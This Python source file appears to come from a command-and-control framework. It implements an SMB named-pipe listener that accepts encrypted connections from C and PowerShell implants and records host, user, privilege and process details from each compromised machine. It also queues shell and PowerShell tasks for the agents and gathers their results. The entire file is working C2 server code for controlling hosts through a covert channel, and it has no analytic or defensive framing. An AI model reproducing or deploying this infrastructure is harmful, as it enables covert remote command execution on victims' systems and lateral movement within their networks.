"""
SMB named pipe listener.

Runs an SMB server (via impacket) that accepts agent connections
on a configurable named pipe.  Supports two protocols:

  - C agent:  ECDH key-exchange + AES-GCM + binary TLV  (magic 0xDEADF00D)
  - PS agent: PSK handshake + AES-256-CBC/HMAC-SHA256 + JSON  (magic "PS")

Wire format on pipe: [4 bytes LE: length] [packet bytes]
"""

import asyncio
import base64
import hashlib
import hmac as _hmac
import json
import logging
import secrets
import socket
import struct
import threading
from pathlib import Path
from typing import Optional
from uuid import UUID

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding

from impacket import smbserver
from impacket.ntlm import compute_lmhash, compute_nthash

from .base import BaseListener
from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.events import event_bus, EventBus
from ..crypto import aes_gcm, key_exchange, nonce
from ..crypto.rsa import load_private_key, rsa_decrypt
from ..protocol.commands import (
    Command, TlvType, TaskType, TaskStatus, DEFAULT_MAGIC, HEADER_SIZE,
)
from ..protocol.tlv import (
    TlvBuilder, iter_tlv, find_tlv, find_tlv_string,
    find_tlv_uint32, find_tlv_uint8,
)
from ..protocol.packet import (
    pack_packet, unpack_packet_header, pack_command, unpack_command,
)
from ..logging.operator_logger import OperatorLogger

log = logging.getLogger(__name__)


# ─── Shared framing helpers ───────────────────────────────────────────

def _read_frame(conn: socket.socket, buf: bytearray) -> Optional[bytes]:
    """Block-read one [4B len][payload] frame.  Returns payload or None on EOF."""
    while True:
        if len(buf) >= 4:
            msg_len = struct.unpack_from("<I", buf, 0)[0]
            if msg_len > 16 * 1024 * 1024:
                buf.clear()
                return None
            total = 4 + msg_len
            if len(buf) >= total:
                payload = bytes(buf[4:total])
                del buf[:total]
                return payload
        chunk = conn.recv(65536)
        if not chunk:
            return None
        buf.extend(chunk)


def _try_extract_frame(buf: bytearray) -> Optional[bytes]:
    """Extract one frame already in *buf* without I/O."""
    if len(buf) < 4:
        return None
    msg_len = struct.unpack_from("<I", buf, 0)[0]
    if msg_len > 16 * 1024 * 1024:
        buf.clear()
        return None
    total = 4 + msg_len
    if len(buf) < total:
        return None
    payload = bytes(buf[4:total])
    del buf[:total]
    return payload


def _frame(data: bytes) -> bytes:
    """Wrap payload in [4-byte LE length][payload]."""
    return struct.pack("<I", len(data)) + data


# ─── C agent protocol handler ────────────────────────────────────────

class SmbPipeHandler:
    """
    Handles a single named-pipe connection from a **C agent**.
    Binary TLV packets with AES-GCM encryption.
    """

    def __init__(self, listener: "SmbListener"):
        self.listener = listener
        self._buf = bytearray()

    def read_framed(self, data: bytes) -> Optional[bytes]:
        self._buf.extend(data)
        return _try_extract_frame(self._buf)

    def frame_response(self, data: bytes) -> bytes:
        return _frame(data)

    def handle_packet(self, packet: bytes) -> Optional[bytes]:
        if len(packet) < HEADER_SIZE:
            return None

        magic, size, msg_id = unpack_packet_header(packet)
        if magic != self.listener.magic:
            return None

        encrypted_payload = packet[HEADER_SIZE:size]
        if not encrypted_payload:
            return None

        agent_id, plaintext = self.listener.decrypt_and_identify(encrypted_payload)
        if plaintext is None:
            return None

        cmd, body = unpack_command(plaintext)

        if cmd == Command.KEY_EXCHANGE_INIT:
            return self.listener.handle_key_exchange(agent_id, body)
        elif cmd == Command.CHECKIN_REQUEST:
            return self.listener.handle_checkin(agent_id, body)
        elif cmd == Command.TASK_RESULT:
            return self.listener.handle_task_result(agent_id, body)
        elif cmd == Command.HEARTBEAT:
            return self.listener.handle_heartbeat(agent_id)
        else:
            log.warning(f"Unknown SMB command 0x{cmd:02X} from {agent_id}")
            return None


# ─── PowerShell agent protocol handler ───────────────────────────────

class PsProtocolHandler:
    """
    Handles a **PowerShell agent** connection over named pipe.

    Handshake:
      Client → [PS 0x01 0x00][32 B nonce][32 B HMAC(nonce, PSK)]   (68 B)
      Server → [OK 0x01 0x00][32 B server_nonce]                    (36 B)
      session_key = SHA-256(PSK ‖ client_nonce ‖ server_nonce)

    Messages (after handshake): AES-256-CBC + HMAC-SHA-256 encrypted JSON.
      Wire: [16 B IV][ciphertext (PKCS-7)][32 B HMAC(IV‖CT)]

    Agent → C2:
      checkin  {"t":"ci","id":"<hex>","h":"HOST","u":"DOM\\user","p":PID,...}
      result   {"t":"result","i":"<task_id>","o":"output","s":0|1}
      heartbeat{"t":"hb"}

    C2 → Agent:
      tasks    {"t":"tasks","d":[{"i":"<id>","c":"shell|powershell|exit","a":"args"},...]}
      ack      {"t":"ack"}
    """

    PS_MAGIC = b"\x50\x53"  # "PS"
    OK_MAGIC = b"\x4F\x4B"  # "OK"

    def __init__(self, listener: "SmbListener"):
        self.listener = listener
        self._session_key: Optional[bytes] = None
        self._agent_id: Optional[str] = None
        self._session: Optional[AgentSession] = None

    # ── Handshake ─────────────────────────────────────────────────────

    def handle_handshake(self, packet: bytes) -> Optional[bytes]:
        """Verify PSK, derive session key.  Returns OK response or None."""
        if len(packet) != 68:
            log.warning(f"PS handshake bad length: {len(packet)}")
            return None
        if packet[:2] != self.PS_MAGIC:
            return None

        client_nonce = packet[4:36]
        client_mac = packet[36:68]

        # Find matching PSK
        matched_psk = None
        for psk in self.listener._ps_keys:
            expected = _hmac.new(psk, client_nonce, hashlib.sha256).digest()
            if _hmac.compare_digest(expected, client_mac):
                matched_psk = psk
                break

        if matched_psk is None:
            log.warning("PS handshake failed — no matching PSK")
            return None

        # Derive session key
        server_nonce = secrets.token_bytes(32)
        self._session_key = hashlib.sha256(
            matched_psk + client_nonce + server_nonce
        ).digest()

        log.info("[+] PS handshake authenticated")
        return self.OK_MAGIC + b"\x01\x00" + server_nonce

    # ── Crypto ────────────────────────────────────────────────────────

    def decrypt(self, data: bytes) -> Optional[bytes]:
        """Decrypt AES-256-CBC + HMAC-SHA-256.  [16 IV][CT][32 MAC]"""
        if len(data) < 49:
            return None
        iv = data[:16]
        mac_recv = data[-32:]
        ct = data[16:-32]

        expected = _hmac.new(
            self._session_key, iv + ct, hashlib.sha256
        ).digest()
        if not _hmac.compare_digest(expected, mac_recv):
            log.warning("PS HMAC verification failed")
            return None

        try:
            decryptor = Cipher(
                algorithms.AES(self._session_key), modes.CBC(iv)
            ).decryptor()
            padded = decryptor.update(ct) + decryptor.finalize()

            unpadder = sym_padding.PKCS7(128).unpadder()
            return unpadder.update(padded) + unpadder.finalize()
        except Exception as e:
            log.warning(f"PS decrypt error: {e}")
            return None

    def encrypt(self, plaintext: bytes) -> bytes:
        """Encrypt with AES-256-CBC + HMAC-SHA-256."""
        iv = secrets.token_bytes(16)

        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(plaintext) + padder.finalize()

        encryptor = Cipher(
            algorithms.AES(self._session_key), modes.CBC(iv)
        ).encryptor()
        ct = encryptor.update(padded) + encryptor.finalize()

        mac = _hmac.new(
            self._session_key, iv + ct, hashlib.sha256
        ).digest()
        return iv + ct + mac

    # ── Message dispatch ──────────────────────────────────────────────

    def handle_message(self, data: bytes) -> Optional[bytes]:
        """Decrypt → process → return encrypted response (or None)."""
        pt = self.decrypt(data)
        if pt is None:
            return None
        try:
            msg = json.loads(pt.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            log.warning(f"PS bad JSON: {e}")
            return None

        t = msg.get("t")
        if t == "ci":
            return self._handle_checkin(msg)
        elif t == "result":
            return self._handle_result(msg)
        elif t == "hb":
            return self._handle_heartbeat()
        else:
            log.warning(f"PS unknown msg type: {t}")
            return None

    # ── Individual handlers ───────────────────────────────────────────

    def _handle_checkin(self, msg: dict) -> bytes:
        self._agent_id = msg.get("id", secrets.token_hex(16))

        session = self.listener.session_manager.get(self._agent_id)
        is_new = session is None
        if not session:
            session = AgentSession(agent_id=self._agent_id)
            session.c2_channel = "SMB-PS"
            session.listener_id = self.listener.listener_id
            self.listener.session_manager.register(session)

        self._session = session
        session.hostname = msg.get("h", "")
        session.username = msg.get("u", "")
        session.pid = msg.get("p", 0)
        session.arch = msg.get("a", "")
        session.os_version = msg.get("o", "")
        session.process_name = msg.get("n", "")
        session.update_last_seen()

        if is_new and session.hostname:
            log.info(
                f"[+] PS agent check-in: {session.hostname} "
                f"({session.username}) PID:{session.pid}"
            )
            if self.listener._loop:
                asyncio.run_coroutine_threadsafe(
                    event_bus.emit(
                        EventBus.AGENT_CHECKIN,
                        session=session, is_new=True,
                    ),
                    self.listener._loop,
                )

        return self._tasks_response(session)

    def _handle_result(self, msg: dict) -> None:
        """Process task result.  Returns None — agent does not expect ACK."""
        if not self._session:
            return None

        self._session.update_last_seen()
        task_id = msg.get("i", "").replace("-", "")
        output = msg.get("o", "")
        status = msg.get("s", 0)

        task = self._session.active_tasks.get(task_id)
        if task:
            result_data = (
                output.encode("utf-8") if isinstance(output, str) else b""
            )
            self.listener.task_manager.mark_complete(
                self._session, task, result_data, status == 0
            )
            self.listener.logger.log_result(
                self._agent_id,
                self._session.hostname,
                task.task_id,
                task.module_name,
                task.status.name,
                None,
                output[:200] if output else "",
            )
            if self.listener._loop:
                asyncio.run_coroutine_threadsafe(
                    event_bus.emit(
                        EventBus.TASK_RESULT,
                        session=self._session,
                        task=task,
                    ),
                    self.listener._loop,
                )
        return None  # no ACK — agent sends results then heartbeat

    def _handle_heartbeat(self) -> bytes:
        if self._session:
            self._session.update_last_seen()
            return self._tasks_response(self._session)
        return self.encrypt(
            json.dumps({"t": "tasks", "d": []}).encode()
        )

    def _tasks_response(self, session: AgentSession) -> bytes:
        """Flush pending tasks → encrypted JSON response."""
        tasks = self.listener.task_manager.flush_pending(session)
        td = []
        for task in tasks:
            args = ""
            if task.arguments:
                args = task.arguments.decode("utf-8", errors="replace")
            td.append({
                "i": task.task_id.replace("-", ""),
                "c": task.module_name or "shell",
                "a": args,
            })
        return self.encrypt(json.dumps({"t": "tasks", "d": td}).encode())


# ─── Listener ─────────────────────────────────────────────────────────

class SmbListener(BaseListener):
    """
    SMB named-pipe listener using impacket.

    Exposes a named pipe via an SMB server.  Agents connect to
    ``\\\\<ip>\\pipe\\<pipename>`` and speak either the binary C-agent
    protocol or the JSON PowerShell-agent protocol.
    """

    def __init__(
        self,
        listener_id: int,
        pipe_name: str,
        session_manager: SessionManager,
        task_manager: TaskManager,
        logger: OperatorLogger,
        host: str = "0.0.0.0",
        rsa_private_key_path: Optional[Path] = None,
        magic: int = DEFAULT_MAGIC,
        name: str = "",
        ps_keys_dir: Optional[Path] = None,
    ):
        super().__init__(listener_id, "SMB", name=name or "SMB")
        self.pipe_name = pipe_name
        self.host = host
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.logger = logger
        self.magic = magic

        # PowerShell PSKs (loaded from disk + registered at runtime)
        self._ps_keys: list[bytes] = []
        self._ps_keys_dir = ps_keys_dir

        self._rsa_private_key = None
        if rsa_private_key_path and rsa_private_key_path.exists():
            self._rsa_private_key = load_private_key(rsa_private_key_path)

        self._server = None
        self._thread: Optional[threading.Thread] = None
        self._tcp_server: Optional[socket.socket] = None
        self._tcp_thread: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None

    # ── PSK management ────────────────────────────────────────────────

    def _load_ps_keys(self):
        """Scan keys directory for ps_*.key files."""
        if not self._ps_keys_dir or not self._ps_keys_dir.exists():
            return
        for key_file in sorted(self._ps_keys_dir.glob("ps_*.key")):
            try:
                data = key_file.read_bytes()
                if len(data) == 32 and data not in self._ps_keys:
                    self._ps_keys.append(data)
                    log.debug(f"Loaded PS key: {key_file.name}")
            except Exception as e:
                log.warning(f"Failed to load PS key {key_file}: {e}")
        if self._ps_keys:
            log.info(f"[*] Loaded {len(self._ps_keys)} PowerShell PSK(s)")

    def add_psk(self, key: bytes):
        """Register a PSK at runtime (called by the generate command)."""
        if len(key) == 32 and key not in self._ps_keys:
            self._ps_keys.append(key)
            log.info("[+] Registered new PowerShell PSK")

    # ── Lifecycle ─────────────────────────────────────────────────────

    async def start(self):
        self._loop = asyncio.get_event_loop()

        # Enable debug logging for impacket so we can see negotiate/auth
        logging.getLogger("impacket").setLevel(logging.DEBUG)

        # Load PowerShell PSKs from disk
        self._load_ps_keys()

        # ── Local TCP server for impacket pipe forwarding ──
        self._tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._tcp_server.bind(("127.0.0.1", 0))
        self._tcp_server.listen(8)
        tcp_port = self._tcp_server.getsockname()[1]

        self._tcp_thread = threading.Thread(
            target=self._tcp_accept_loop, daemon=True
        )
        self._tcp_thread.start()

        # ── impacket SMB server ──
        self._server = smbserver.SimpleSMBServer(
            listenAddress=self.host,
            listenPort=445,
        )

        # Register named pipe → impacket forwards pipe I/O to our TCP handler
        self._server.registerNamedPipe(
            self.pipe_name, ("127.0.0.1", tcp_port)
        )

        # Start SMB server in a thread
        self._thread = threading.Thread(
            target=self._run_server, daemon=True
        )
        self._thread.start()
        self.running = True
        log.info(
            f"[*] SMB listener started on {self.host} "
            f"(pipe: {self.pipe_name})"
        )

    def _run_server(self):
        try:
            self._server.start()
        except Exception as e:
            log.error(f"SMB server error: {e}")
            self.running = False

    async def stop(self):
        self.running = False
        if self._tcp_server:
            try:
                self._tcp_server.close()
            except Exception:
                pass
        if self._server:
            try:
                self._server.stop()
            except Exception:
                pass
        log.info(f"[*] SMB listener stopped (pipe: {self.pipe_name})")

    def info(self) -> dict:
        return {
            "id": self.listener_id,
            "name": self.name,
            "type": self.listener_type,
            "interface": self.host,
            "port": f"pipe:{self.pipe_name}",
            "status": "RUNNING" if self.running else "STOPPED",
        }

    # ── TCP accept / pipe dispatch ────────────────────────────────────

    def _tcp_accept_loop(self):
        """Accept TCP connections from impacket's pipe forwarder."""
        while True:
            try:
                conn, _ = self._tcp_server.accept()
                log.debug("Pipe TCP connection from impacket forwarder")
                t = threading.Thread(
                    target=self._tcp_pipe_handler,
                    args=(conn,),
                    daemon=True,
                )
                t.start()
            except OSError:
                break  # Socket closed in stop()

    def _tcp_pipe_handler(self, conn: socket.socket):
        """Handle pipe I/O for one agent session.

        Reads the first framed packet, inspects its first two bytes:
          - ``PS`` (0x50 0x53) → PowerShell JSON protocol
          - anything else      → C binary TLV protocol
        """
        conn.settimeout(300)  # 5 min idle timeout
        buf = bytearray()

        try:
            # ── Read first frame to detect protocol ──
            first = _read_frame(conn, buf)
            if first is None:
                return

            if len(first) >= 2 and first[:2] == PsProtocolHandler.PS_MAGIC:
                # ───────── PowerShell agent ─────────
                ps = PsProtocolHandler(self)
                resp = ps.handle_handshake(first)
                if resp is None:
                    log.warning("PS handshake failed — closing pipe")
                    return
                conn.sendall(_frame(resp))

                # Encrypted JSON message loop
                while True:
                    frame = _read_frame(conn, buf)
                    if frame is None:
                        break
                    resp = ps.handle_message(frame)
                    if resp is not None:
                        conn.sendall(_frame(resp))

            else:
                # ───────── C agent ─────────
                handler = SmbPipeHandler(self)

                # Process first packet
                resp = handler.handle_packet(first)
                if resp is not None:
                    conn.sendall(_frame(resp))

                # Feed any data left in buf from the initial read
                if buf:
                    handler._buf.extend(buf)
                    buf.clear()
                    packet = handler.read_framed(b"")
                    while packet is not None:
                        resp = handler.handle_packet(packet)
                        if resp is not None:
                            conn.sendall(_frame(resp))
                        packet = handler.read_framed(b"")

                # Continue reading from socket
                while True:
                    data = conn.recv(65536)
                    if not data:
                        break
                    packet = handler.read_framed(data)
                    while packet is not None:
                        resp = handler.handle_packet(packet)
                        if resp is not None:
                            conn.sendall(_frame(resp))
                        packet = handler.read_framed(b"")

        except socket.timeout:
            log.debug("SMB pipe handler idle timeout")
        except (ConnectionError, OSError) as e:
            log.debug(f"SMB pipe handler closed: {e}")
        finally:
            conn.close()

    # ─── C-agent protocol handlers (shared with SmbPipeHandler) ───────

    def decrypt_and_identify(
        self, encrypted_payload: bytes
    ) -> tuple[Optional[str], Optional[bytes]]:
        """Try to decrypt payload, identifying the agent."""
        for session in self.session_manager.all_sessions():
            if not session.encryption_key:
                continue
            try:
                plaintext = aes_gcm.decrypt(
                    session.encryption_key, encrypted_payload
                )
                self.logger.log_raw_traffic(
                    "AGENT→C2", session.agent_id,
                    encrypted_payload, len(plaintext),
                )
                return session.agent_id, plaintext
            except Exception:
                continue

        # Try RSA for key exchange
        if self._rsa_private_key:
            try:
                plaintext = rsa_decrypt(
                    self._rsa_private_key, encrypted_payload
                )
                if len(plaintext) >= 16:
                    agent_id = UUID(bytes=plaintext[:16]).hex
                    inner = pack_command(
                        Command.KEY_EXCHANGE_INIT, plaintext[16:]
                    )
                    return agent_id, inner
            except Exception:
                pass

        return None, None

    def handle_key_exchange(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        if len(body) < 65:
            return None

        agent_pub_bytes = body[:65]
        server_priv, server_pub_bytes = key_exchange.generate_keypair()

        agent_id_bytes = (
            bytes.fromhex(agent_id)
            if len(agent_id) == 32
            else agent_id.encode()[:16]
        )
        session_key = key_exchange.derive_session_key(
            server_priv, agent_pub_bytes, salt=agent_id_bytes
        )

        session = self.session_manager.get(agent_id)
        if not session:
            session = AgentSession(agent_id=agent_id)
            session.c2_channel = "SMB"
            session.listener_id = self.listener_id
            self.session_manager.register(session)

        session.encryption_key = session_key
        session.peer_public_key = agent_pub_bytes
        session.nonce_manager = nonce.NonceManager(
            agent_id_prefix=agent_id_bytes[:4], is_server=True
        )
        session.update_last_seen()

        log.info(f"[+] SMB key exchange completed: {agent_id[:8]}")

        resp_plaintext = pack_command(
            Command.KEY_EXCHANGE_RESP, server_pub_bytes
        )
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted_resp = aes_gcm.encrypt(
            session_key, nonce_bytes, resp_plaintext
        )

        combined_payload = server_pub_bytes + encrypted_resp
        return pack_packet(combined_payload, 0, self.magic)

    def handle_checkin(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None

        self._update_session(session, body)
        session.update_last_seen()

        is_new = not session.hostname
        self._update_session(session, body)

        if is_new and session.hostname:
            log.info(
                f"[+] SMB agent check-in: {session.hostname} "
                f"({session.username}) PID:{session.pid}"
            )
            if self._loop:
                asyncio.run_coroutine_threadsafe(
                    event_bus.emit(
                        EventBus.AGENT_CHECKIN,
                        session=session, is_new=True,
                    ),
                    self._loop,
                )

        tasks = self.task_manager.flush_pending(session)
        resp_body = TlvBuilder()
        for task in tasks:
            resp_body.add_uuid(
                TlvType.TASK_ID,
                bytes.fromhex(task.task_id.replace("-", ""))[:16],
            )
            resp_body.add_uint8(TlvType.TASK_TYPE, task.task_type)
            resp_body.add_string(TlvType.MODULE_NAME, task.module_name)
            if task.payload:
                resp_body.add_bytes(TlvType.TASK_PAYLOAD, task.payload)
            if task.arguments:
                resp_body.add_bytes(TlvType.TASK_ARGUMENTS, task.arguments)
            resp_body.add_uint32(TlvType.TASK_TIMEOUT, task.timeout_seconds)

        resp_plaintext = pack_command(
            Command.CHECKIN_RESPONSE, resp_body.build()
        )
        return self._encrypt_response(session, resp_plaintext)

    def handle_task_result(
        self, agent_id: str, body: bytes
    ) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None

        session.update_last_seen()

        task_id_bytes = find_tlv(body, TlvType.TASK_ID)
        result_data = find_tlv(body, TlvType.RESULT_OUTPUT) or b""
        status_byte = find_tlv_uint8(body, TlvType.RESULT_STATUS)

        if task_id_bytes:
            task_id = (
                UUID(bytes=task_id_bytes[:16]).hex
                if len(task_id_bytes) >= 16
                else task_id_bytes.hex()
            )
            task = session.active_tasks.get(task_id)
            if task:
                success = (status_byte == 0) if status_byte is not None else True
                self.task_manager.mark_complete(
                    session, task, result_data, success
                )
                self.logger.log_result(
                    agent_id, session.hostname, task.task_id,
                    task.module_name, task.status.name, None,
                    result_data[:200].decode("utf-8", errors="replace")
                    if result_data
                    else "",
                )
                if self._loop:
                    asyncio.run_coroutine_threadsafe(
                        event_bus.emit(
                            EventBus.TASK_RESULT,
                            session=session, task=task,
                        ),
                        self._loop,
                    )

        resp_plaintext = pack_command(Command.TASK_RESULT_ACK, b"")
        return self._encrypt_response(session, resp_plaintext)

    def handle_heartbeat(self, agent_id: str) -> Optional[bytes]:
        session = self.session_manager.get(agent_id)
        if not session:
            return None
        session.update_last_seen()
        resp_plaintext = pack_command(Command.HEARTBEAT_ACK, b"")
        return self._encrypt_response(session, resp_plaintext)

    def _update_session(self, session: AgentSession, body: bytes):
        for entry in iter_tlv(body):
            t, v = entry.type, entry.value
            try:
                if t == TlvType.HOSTNAME:
                    session.hostname = v.decode("utf-8")
                elif t == TlvType.USERNAME:
                    session.username = v.decode("utf-8")
                elif t == TlvType.PID:
                    session.pid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.PPID:
                    session.ppid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.ARCH:
                    session.arch = "x64" if v[0] == 0x02 else "x86"
                elif t == TlvType.OS_VERSION:
                    session.os_version = v.decode("utf-8")
                elif t == TlvType.INTEGRITY:
                    levels = {0: "LOW", 1: "MEDIUM", 2: "HIGH", 3: "SYSTEM"}
                    session.integrity = levels.get(v[0], "UNKNOWN")
                elif t == TlvType.IS_ADMIN:
                    session.is_admin = bool(v[0])
                elif t == TlvType.PROCESS_NAME:
                    session.process_name = v.decode("utf-8")
                elif t == TlvType.DOTNET_VERSION:
                    session.dotnet_version = v.decode("utf-8")
                elif t == TlvType.AGENT_VERSION:
                    session.agent_version = v.decode("utf-8")
                elif t == TlvType.CWD:
                    session.cwd = v.decode("utf-8")
            except Exception:
                continue

    def _encrypt_response(
        self, session: AgentSession, plaintext: bytes
    ) -> bytes:
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted = aes_gcm.encrypt(
            session.encryption_key, nonce_bytes, plaintext
        )
        packet = pack_packet(encrypted, 0, self.magic)
        self.logger.log_raw_traffic(
            "C2→AGENT", session.agent_id, encrypted, len(plaintext)
        )
        return packet
